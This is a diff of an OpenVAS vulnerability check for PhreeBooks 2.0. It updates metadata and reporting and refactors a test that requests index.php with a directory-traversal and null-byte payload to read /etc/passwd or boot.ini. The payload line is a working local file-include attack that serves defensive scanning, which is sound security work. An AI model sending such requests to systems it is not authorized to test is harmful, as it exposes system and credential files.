@@ -1,6 +1,5 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_PhreeBooks_40639.nasl 14233 2019-03-16 13:32:43Z mmartin $
 #
 # PhreeBooks Multiple HTML-Injection and Local File Include Vulnerabilities
 #
@@ -24,12 +23,11 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.100670");
-  script_version("$Revision: 14233 $");
-  script_tag(name:"last_modification", value:"$Date: 2019-03-16 14:32:43 +0100 (Sat, 16 Mar 2019) $");
+  script_version("2019-05-13T14:05:09+0000");
+  script_tag(name:"last_modification", value:"2019-05-13 14:05:09 +0000 (Mon, 13 May 2019)");
   script_tag(name:"creation_date", value:"2010-06-10 10:47:44 +0200 (Thu, 10 Jun 2010)");
   script_bugtraq_id(40639);
   script_tag(name:"cvss_base", value:"6.8");
@@ -45,24 +43,26 @@ if (description)
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
-  script_dependencies("gb_PhreeBooks_detect.nasl");
+  script_dependencies("gb_PhreeBooks_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
-  script_exclude_keys("Settings/disable_cgi_scanning");
+  script_mandatory_keys("phreebooks/detected");
+
   script_tag(name:"summary", value:"PhreeBooks is prone to multiple local file-include vulnerabilities and
-multiple HTML-injection vulnerabilities because it fails to properly
-sanitize user-supplied input.
+  multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.");
 
-An attacker can exploit the local file-include vulnerabilities using
-directory-traversal strings to view files and execute local scripts in
-the context of the webserver process. Other attacks are also possible.
+  script_tag(name:"impact", value:"An attacker can exploit the local file-include vulnerabilities using
+  directory-traversal strings to view files and execute local scripts in
+  the context of the webserver process. Other attacks are also possible.
 
-The attacker may leverage the HTML-injection issues to execute
-arbitrary script code in the browser of an unsuspecting user in the
-context of the affected site. This may let the attacker steal cookie-
-based authentication credentials and launch other attacks.
+  The attacker may leverage the HTML-injection issues to execute
+  arbitrary script code in the browser of an unsuspecting user in the
+  context of the affected site. This may let the attacker steal cookie-
+  based authentication credentials and launch other attacks.");
 
-PhreeBooks 2.0 is vulnerable. Other versions may also be affected.");
+  script_tag(name:"affected", value:"PhreeBooks 2.0 is vulnerable. Other versions may also be affected.");
+
   script_tag(name:"solution_type", value:"WillNotFix");
+
   script_tag(name:"solution", value:"No known solution was made available for at least one year
   since the disclosure of this vulnerability. Likely none will be provided anymore.
   General solution options are to upgrade to a newer release, disable respective features,
@@ -74,24 +74,26 @@ PhreeBooks 2.0 is vulnerable. Other versions may also be affected.");
 include("http_func.inc");
 include("http_keepalive.inc");
 include("version_func.inc");
+include("misc_func.inc");
+include("host_details.inc");
 
 port = get_http_port(default:80);
 
-if(!get_port_state(port))exit(0);
-if(!can_host_php(port:port))exit(0);
+if(!dir = get_dir_from_kb(port:port,app:"PhreeBooks"))
+  exit(0);
 
-if(!dir = get_dir_from_kb(port:port,app:"PhreeBooks"))exit(0);
-files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");
+files = traversal_files();
 
-foreach file (keys(files)) {
+foreach pattern(keys(files)) {
 
-  url = string(dir,"/index.php?language=../../../../../../../../../../../../../../../../../../../../",files[file],"%00");
+  file = files[pattern];
 
-  if(http_vuln_check(port:port, url:url,pattern:file)) {
+  url = string(dir,"/index.php?language=../../../../../../../../../../../../../../../../../../../../",file,"%00");
 
-    security_message(port:port);
+  if(http_vuln_check(port:port, url:url, pattern:pattern)) {
+    report = report_vuln_url(port:port, url:url);
+    security_message(port:port, data:report);
     exit(0);
-
   }
 }
 
